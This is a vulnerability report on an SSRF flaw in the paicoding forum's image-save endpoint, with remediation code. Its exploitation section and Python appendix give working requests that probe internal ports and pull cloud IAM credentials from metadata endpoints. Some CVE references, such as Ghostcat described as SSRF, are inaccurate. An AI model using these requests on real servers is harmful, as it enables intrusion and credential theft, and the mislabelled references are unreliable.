# CVE Vulnerability Report: SSRF in paicoding Forum System

## 1. Vulnerability Overview

**Vulnerability Type**: Server-Side Request Forgery (SSRF)  
**Severity**: High  
**CVSS Score**: 8.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)  
**Affected Versions**: paicoding-1.0.3 and earlier  
**Discovery Date**: 2024  
**Reporter**: [Your Name]  

## 2. Vulnerability Description

The paicoding forum system contains a Server-Side Request Forgery (SSRF) vulnerability in its image hosting functionality. This vulnerability allows low privileged users to craft malicious URLs that cause the server to initiate HTTP requests to arbitrary addresses.

## 3. Affected Components

- **Project Name**: paicoding-forum 
- **Version**: 1.0.3
- **Affected Files**:
  - `paicoding-service/src/main/java/com/github/paicoding/forum/service/image/service/ImageServiceImpl.java`
  - `paicoding-web/src/main/java/com/github/paicoding/forum/web/common/image/rest/ImageRestController.java`

## 4. Vulnerability Details

### 4.1 Vulnerability Location

#### 4.1.1 Controller Layer

**File**: `paicoding-web/src/main/java/com/github/paicoding/forum/web/common/image/rest/ImageRestController.java`

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091634832.png)

**Issues**:
1. `@RequestMapping(path = "save")` does not specify HTTP method, defaulting to support GET, POST, PUT, DELETE, and other methods
2. Directly accepts user-provided URL parameter `imgUrl` without any validation or filtering
3. Only checks if URL is empty, does not validate URL format, protocol type, target address, etc.

#### 4.1.2 Service Layer

**File**: `paicoding-service/src/main/java/com/github/paicoding/forum/service/image/service/ImageServiceImpl.java`

```java
@Service
public class ImageServiceImpl implements ImageService {
    
    @Autowired
    private ImageUploader imageUploader;

    /**
     * External image hosting cache
     */
    private LoadingCache<String, String> imgReplaceCache = CacheBuilder.newBuilder()
        .maximumSize(300)
        .expireAfterWrite(5, TimeUnit.MINUTES)
        .build(new CacheLoader<String, String>() {
            @Override
            public String load(String img) {
                try {
                    // Dangerous: Directly uses user-provided URL without whitelist validation
                    InputStream stream = FileReadUtil.getStreamByFileName(img);
                    URI uri = URI.create(img);
                    String path = uri.getPath();
                    int index = path.lastIndexOf(".");
                    String fileType = null;
                    if (index > 0) {
                        fileType = path.substring(index + 1);
                    }
                    return imageUploader.upload(stream, fileType);
                } catch (Exception e) {
                    log.error("External image hosting exception! img:{}", img, e);
                    return "";
                }
            }
        });

    @Override
    public String saveImg(String img) {
        // Only checks if it's a CDN or OSS image, does not check if it's an internal address
        if (imageUploader.uploadIgnore(img)) {
            return img;
        }
        
        try {
            String ans = imgReplaceCache.get(img);
            if (StringUtils.isBlank(ans)) {
                return buildUploadFailImgUrl(img);
            }
            return ans;
        } catch (Exception e) {
            log.error("External image hosting exception! img:{}", img, e);
            return buildUploadFailImgUrl(img);
        }
    }
}
```

**Issues**:
1. `FileReadUtil.getStreamByFileName(img)` method directly uses user-provided URL to initiate HTTP requests
2. No whitelist validation for URLs, allowing access to arbitrary addresses
3. Does not check if target address is an internal IP (127.0.0.1, 10.x.x.x, 172.16.x.x-172.31.x.x, 192.168.x.x)
4. Does not restrict protocol types, potentially supporting dangerous protocols like file://, gopher://, dict://
5. Exception handling only logs errors, does not prevent attacks

#### 4.1.3 Attack Path Analysis

**Complete Call Chain**:
```
HTTP Request (GET/POST /image/save?img=malicious_URL)
    ↓
ImageRestController.save(String imgUrl)  // Line 81: Receives user-provided URL
    ↓
ImageServiceImpl.saveImg(String img)  // Line 99: Calls saveImg method
    ↓
imgReplaceCache.get(img)  // Line 106: Gets from cache, triggers load if cache miss
    ↓
LoadingCache automatically calls CacheLoader.load(String img)  // Line 49: Guava Cache mechanism auto-triggers
    ↓
FileReadUtil.getStreamByFileName(String img)  // Line 51: Initiates HTTP request
    ↓
Server initiates request to malicious URL (SSRF attack occurs)
```

**Key Mechanism Explanation**:

1. **Guava LoadingCache Mechanism**:
   - `imgReplaceCache` is a `LoadingCache<String, String>` object (Line 47)
   - When `imgReplaceCache.get(img)` is called (Line 106), Guava checks if the key exists in cache
   - If cache miss occurs (first access or cache expired), Guava automatically calls `CacheLoader.load(String img)` method
   - This is the standard Guava Cache mechanism for automatic cache loading

2. **Code Location Details**:
   ```java
   // Line 47: Creates LoadingCache, defines CacheLoader
   private LoadingCache<String, String> imgReplaceCache = 
       CacheBuilder.newBuilder()
       .maximumSize(300)
       .expireAfterWrite(5, TimeUnit.MINUTES)
       .build(new CacheLoader<String, String>() {
           @Override
           public String load(String img) {  // Automatically called on cache miss
               InputStream stream = FileReadUtil.getStreamByFileName(img);  // Dangerous!
               // ...
           }
       });
   
   // Line 106: Calls get method, triggers load method
   public String saveImg(String img) {
       // ...
       String ans = imgReplaceCache.get(img);  // If cache miss, automatically calls load method
       // ...
   }
   ```

3. **Cache Mechanism Function**:
   - Cache expiration time is 5 minutes (`expireAfterWrite(5, TimeUnit.MINUTES)`)
   - Maximum cache size is 300 entries (`maximumSize(300)`)
   - First access to URL triggers SSRF, subsequent accesses within 5 minutes use cache and do not trigger requests again
   - However, attackers can use different URLs or wait for cache expiration to continue attacks

### 4.2 Code Audit Findings

#### 4.2.1 Missing Input Validation

**Code Location**: `ImageRestController.java:81`

```java
@RequestMapping(path = "save")
public ResVo<ImageVo> save(@RequestParam(name = "img", defaultValue = "") String imgUrl) {
    // Only checks if empty, no security validation performed
    if (StringUtils.isBlank(imgUrl)) {
        return ResVo.ok(imageVo);
    }
    // Directly uses user input
    String url = imageService.saveImg(imgUrl);
    ...
}
```

**Issues**: 
- Missing URL format validation
- Missing protocol type restrictions (should only allow http/https)
- Missing target address whitelist validation
- Missing internal address detection

#### 4.2.2 Insecure External Requests

**Code Location**: `ImageServiceImpl.java:51`

```java
InputStream stream = FileReadUtil.getStreamByFileName(img);
```

**Issues**:
- `FileReadUtil.getStreamByFileName()` method may support multiple protocols (http, https, file, etc.)
- No validation of target address
- No request timeout set
- No request size limit
- No response content type validation

#### 4.2.3 Insufficient Access Control

**Code Location**: `ImageRestController.java:28`

```java
@Permission(role = UserRole.LOGIN)
```

**Issues**:
- Only requires user login, any authenticated user can trigger SSRF
- No additional verification for sensitive operations
- No request rate limiting implemented

## 5. Exploitation

### 5.1 Attack Scenarios

#### Scenario 1: Internal Network Service Reconnaissance

Attackers can access internal services via SSRF to probe internal network topology:

```http
GET /image/save?img=http://127.0.0.1:8080/admin HTTP/1.1
Host: target.com
Cookie: f-session=attacker_session
```

#### Scenario 2: Port Scanning

Attackers can scan internal ports to identify open services:

```http
GET /image/save?img=http://127.0.0.1:3306 HTTP/1.1
GET /image/save?img=http://127.0.0.1:6379 HTTP/1.1
GET /image/save?img=http://127.0.0.1:27017 HTTP/1.1
```

#### Scenario 3: Cloud Server Metadata Leakage

Attackers can access cloud server metadata endpoints to obtain sensitive information:

**AWS EC2**:
```http
GET /image/save?img=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

**Alibaba Cloud ECS**:
```http
GET /image/save?img=http://100.100.100.200/latest/meta-data/ HTTP/1.1
```

**Tencent Cloud CVM**:
```http
GET /image/save?img=http://metadata.tencentyun.com/latest/meta-data/ HTTP/1.1
```

#### Scenario 4: Internal Application Attacks

Attackers can access internal web applications, bypassing firewall restrictions:

```http
GET /image/save?img=http://192.168.1.100:8080/admin/users HTTP/1.1
```

### 5.2 Vulnerability Verification

#### 5.2.1 Basic Verification

**Step 1**: Login to system and obtain session

**Step 2**: Craft malicious request

```bash
curl -X GET "http://target.com/image/save?img=http://127.0.0.1:8080" \
  -H "Cookie: f-session=YOUR_SESSION_TOKEN"
```

**Step 3**: Observe server response and logs

#### 5.2.2 Internal Network Reconnaissance Verification

```bash
# Test local service
curl "http://target.com/image/save?img=http://127.0.0.1:8080/admin"

# Test internal service
curl "http://target.com/image/save?img=http://192.168.1.1:8080"

# Test cloud metadata
curl "http://target.com/image/save?img=http://169.254.169.254/latest/meta-data/"
```

### 5.3 PoC (Proof of Concept)

#### PoC 1: Basic SSRF Test

```http
GET /image/save?img=http://127.0.0.1:8080 HTTP/1.1
Host: vulnerable-target.com
Cookie: f-session=valid_session_token
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

#### PoC 2: Internal Service Access

```http
GET /image/save?img=http://192.168.1.100:3306 HTTP/1.1
Host: vulnerable-target.com
Cookie: f-session=valid_session_token
```

#### PoC 3: Cloud Metadata Leakage

```http
GET /image/save?img=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: vulnerable-target.com
Cookie: f-session=valid_session_token
```

#### PoC 4: Using POST Method

```http
POST /image/save HTTP/1.1
Host: vulnerable-target.com
Cookie: f-session=valid_session_token
Content-Type: application/x-www-form-urlencoded

img=http://127.0.0.1:8080/admin
```

## 6. Impact Assessment

### 6.1 Security Impact

1. **Internal Network Reconnaissance**: Attackers can probe internal network topology, identify internal services and ports
2. **Information Disclosure**: Can access internal services to obtain sensitive information
3. **Cloud Service Attacks**: Can access cloud server metadata endpoints to obtain access credentials
4. **Port Scanning**: Can scan internal ports to identify open services
5. **Internal Application Attacks**: Can bypass firewalls to directly attack internal applications

### 6.2 Business Impact

1. **Data Breach**: May lead to internal network data leakage
2. **Service Disruption**: May affect internal services
3. **Compliance Risk**: May violate data protection regulations
4. **Reputation Damage**: May impact corporate reputation

### 6.3 CVSS Score Explanation

- **Attack Vector (AV)**: Network (N) - Can be exploited remotely over network
- **Attack Complexity (AC)**: Low (L) - Attack is simple, no special conditions required
- **Privileges Required (PR)**: Low (L) - Only requires authenticated user privileges
- **User Interaction (UI)**: None (N) - No user interaction required
- **Scope (S)**: Unchanged (U) - Scope remains unchanged
- **Confidentiality Impact (C)**: High (H) - May disclose sensitive information
- **Integrity Impact (I)**: High (H) - May affect data integrity
- **Availability Impact (A)**: Low (L) - Minimal impact on availability

**CVSS 3.1 Base Score: 8.6 (High)**

## 7. Remediation Recommendations

### 7.1 Short-term Fix

#### Solution 1: URL Whitelist Validation

```java
@RequestMapping(path = "save")
public ResVo<ImageVo> save(@RequestParam(name = "img", defaultValue = "") String imgUrl) {
    ImageVo imageVo = new ImageVo();
    if (StringUtils.isBlank(imgUrl)) {
        return ResVo.ok(imageVo);
    }
    
    // Add URL validation
    if (!isAllowedUrl(imgUrl)) {
        return ResVo.fail(StatusEnum.ILLEGAL_ARGUMENTS_MIXED, "Image URL not allowed");
    }
    
    String url = imageService.saveImg(imgUrl);
    imageVo.setImagePath(url);
    return ResVo.ok(imageVo);
}

private boolean isAllowedUrl(String url) {
    try {
        URI uri = new URI(url);
        String scheme = uri.getScheme();
        String host = uri.getHost();
        
        // Only allow http and https protocols
        if (!"http".equalsIgnoreCase(scheme) && !"https".equalsIgnoreCase(scheme)) {
            return false;
        }
        
        // Check if it's an internal address
        if (isInternalAddress(host)) {
            return false;
        }
        
        // Whitelist validation (optional)
        List<String> allowedHosts = Arrays.asList("example.com", "cdn.example.com");
        if (!allowedHosts.contains(host)) {
            return false;
        }
        
        return true;
    } catch (Exception e) {
        return false;
    }
}

private boolean isInternalAddress(String host) {
    try {
        InetAddress address = InetAddress.getByName(host);
        return address.isLoopbackAddress() 
            || address.isSiteLocalAddress()
            || address.isLinkLocalAddress()
            || address.isAnyLocalAddress();
    } catch (Exception e) {
        return true; // On parse failure, default to deny
    }
}
```

#### Solution 2: Use Dedicated HTTP Client

```java
private static final List<String> ALLOWED_HOSTS = Arrays.asList(
    "cdn.example.com",
    "images.example.com"
);

private InputStream fetchImage(String url) throws Exception {
    URI uri = new URI(url);
    
    // Validate protocol
    if (!"http".equalsIgnoreCase(uri.getScheme()) && 
        !"https".equalsIgnoreCase(uri.getScheme())) {
        throw new IllegalArgumentException("Only http and https protocols supported");
    }
    
    // Validate host
    String host = uri.getHost();
    if (!ALLOWED_HOSTS.contains(host)) {
        throw new IllegalArgumentException("Host not in allowed list");
    }
    
    // Check internal address
    InetAddress address = InetAddress.getByName(host);
    if (address.isLoopbackAddress() || address.isSiteLocalAddress()) {
        throw new IllegalArgumentException("Internal addresses not allowed");
    }
    
    // Use RestTemplate to make request with timeout
    RestTemplate restTemplate = new RestTemplate();
    HttpComponentsClientHttpRequestFactory factory = 
        new HttpComponentsClientHttpRequestFactory();
    factory.setConnectTimeout(5000);
    factory.setReadTimeout(5000);
    restTemplate.setRequestFactory(factory);
    
    ResponseEntity<byte[]> response = restTemplate.getForEntity(url, byte[].class);
    return new ByteArrayInputStream(response.getBody());
}
```

### 7.2 Long-term Fix

1. **Implement URL Whitelist Mechanism**: Maintain a whitelist of allowed image domains
2. **Add Request Validation**: Validate request source, frequency, etc.
3. **Use Proxy Service**: Forward requests through proxy service with strict security policies
4. **Content Validation**: Verify downloaded content is actually an image format
5. **Logging and Monitoring**: Log all image hosting requests, monitor for anomalous behavior
6. **WAF Protection**: Filter SSRF attack requests at WAF level

### 7.3 Code Fix Example

**Fixed ImageServiceImpl.java**:

```java
@Service
public class ImageServiceImpl implements ImageService {
    
    private static final List<String> ALLOWED_DOMAINS = Arrays.asList(
        "cdn.tobebetterjavaer.com",
        "example.com"
    );
    
    private LoadingCache<String, String> imgReplaceCache = 
        CacheBuilder.newBuilder()
        .maximumSize(300)
        .expireAfterWrite(5, TimeUnit.MINUTES)
        .build(new CacheLoader<String, String>() {
            @Override
            public String load(String img) {
                try {
                    // Validate URL
                    validateImageUrl(img);
                    
                    // Use secure HTTP client
                    InputStream stream = fetchImageSafely(img);
                    
                    URI uri = URI.create(img);
                    String path = uri.getPath();
                    int index = path.lastIndexOf(".");
                    String fileType = null;
                    if (index > 0) {
                        fileType = path.substring(index + 1);
                    }
                    return imageUploader.upload(stream, fileType);
                } catch (Exception e) {
                    log.error("External image hosting exception! img:{}", img, e);
                    throw new RuntimeException("Image hosting failed", e);
                }
            }
        });
    
    private void validateImageUrl(String url) throws Exception {
        URI uri = new URI(url);
        
        // Validate protocol
        String scheme = uri.getScheme();
        if (!"http".equalsIgnoreCase(scheme) && 
            !"https".equalsIgnoreCase(scheme)) {
            throw new IllegalArgumentException("Only http and https protocols supported");
        }
        
        // Validate host
        String host = uri.getHost();
        if (host == null) {
            throw new IllegalArgumentException("Invalid URL");
        }
        
        // Check internal address
        InetAddress address = InetAddress.getByName(host);
        if (address.isLoopbackAddress() || 
            address.isSiteLocalAddress() || 
            address.isLinkLocalAddress() ||
            address.isAnyLocalAddress()) {
            throw new IllegalArgumentException("Internal addresses not allowed");
        }
        
        // Check private IP ranges
        if (isPrivateIP(host)) {
            throw new IllegalArgumentException("Private IPs not allowed");
        }
        
        // Whitelist validation
        if (!ALLOWED_DOMAINS.contains(host)) {
            throw new IllegalArgumentException("Host not in allowed domain list");
        }
    }
    
    private boolean isPrivateIP(String host) {
        try {
            InetAddress address = InetAddress.getByName(host);
            byte[] bytes = address.getAddress();
            
            // 10.0.0.0/8
            if (bytes[0] == 10) return true;
            
            // 172.16.0.0/12
            if (bytes[0] == (byte)172 && bytes[1] >= 16 && bytes[1] <= 31) {
                return true;
            }
            
            // 192.168.0.0/16
            if (bytes[0] == (byte)192 && bytes[1] == (byte)168) {
                return true;
            }
            
            // 127.0.0.0/8
            if (bytes[0] == 127) return true;
            
            return false;
        } catch (Exception e) {
            return true;
        }
    }
    
    private InputStream fetchImageSafely(String url) throws Exception {
        RestTemplate restTemplate = new RestTemplate();
        
        // Set timeout
        HttpComponentsClientHttpRequestFactory factory = 
            new HttpComponentsClientHttpRequestFactory();
        factory.setConnectTimeout(5000);
        factory.setReadTimeout(10000);
        restTemplate.setRequestFactory(factory);
        
        // Set request headers
        HttpHeaders headers = new HttpHeaders();
        headers.set("User-Agent", "Mozilla/5.0");
        
        HttpEntity<?> entity = new HttpEntity<>(headers);
        
        // Make request
        ResponseEntity<byte[]> response = restTemplate.exchange(
            url, 
            HttpMethod.GET, 
            entity, 
            byte[].class
        );
        
        // Validate response
        if (response.getStatusCode().is2xxSuccessful()) {
            return new ByteArrayInputStream(response.getBody());
        } else {
            throw new RuntimeException("Image download failed");
        }
    }
}
```

## 8. Related CVE References

- CVE-2021-44228 (Log4j) - Similar server-side request issues
- CVE-2020-1938 (Ghostcat) - Apache Tomcat SSRF vulnerability
- OWASP Top 10 2021 - A05:2021 – Security Misconfiguration

## 9. Timeline

- **Discovery Date**: [Date]
- **Report Date**: [Date]
- **Confirmation Date**: [Date]
- **Fix Date**: [TBD]
- **Public Disclosure Date**: [TBD]

## 10. References

1. OWASP - Server-Side Request Forgery (SSRF): https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
2. CWE-918: Server-Side Request Forgery (SSRF): https://cwe.mitre.org/data/definitions/918.html
3. Project Source Code: https://github.com/itwanger/paicoding
4. Project Version: paicoding-1.0.3

## 11. Disclaimer

This report is intended solely for security research and vulnerability remediation purposes. All information in this report is based on code audit findings and has not been tested through actual attacks. The report author assumes no responsibility for any illegal activities using the information contained in this report.

---

## Appendix: Vulnerability Verification Script

```python
#!/usr/bin/env python3
"""
SSRF Vulnerability Verification Script
Used to verify SSRF vulnerability in paicoding image hosting functionality
"""

import requests
import sys

def test_ssrf(target_url, session_cookie, test_url):
    """
    Test SSRF vulnerability
    
    :param target_url: Target website URL
    :param session_cookie: Session cookie after login
    :param test_url: SSRF target URL to test
    """
    headers = {
        'Cookie': f'f-session={session_cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }
    
    # Use GET method
    params = {'img': test_url}
    
    try:
        response = requests.get(
            f'{target_url}/image/save',
            params=params,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )
        
        print(f"[*] Test URL: {test_url}")
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Length: {len(response.content)}")
        
        if response.status_code == 200:
            print("[+] SSRF vulnerability may exist")
            print(f"[+] Response Content: {response.text[:200]}")
        else:
            print("[-] Request failed or protection enabled")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request Exception: {e}")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage: python3 ssrf_test.py <target_url> <session_cookie> <test_url>")
        print("Example: python3 ssrf_test.py http://target.com session_token http://127.0.0.1:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    session_cookie = sys.argv[2]
    test_url = sys.argv[3]
    
    # Test list
    test_urls = [
        'http://127.0.0.1:8080',
        'http://192.168.1.1:8080',
        'http://169.254.169.254/latest/meta-data/',
        test_url
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Session: {session_cookie[:20]}...")
    print("[*] Starting SSRF vulnerability test\n")
    
    for url in test_urls:
        test_ssrf(target_url, session_cookie, url)
        print("-" * 50)
```

---

**End of Report**

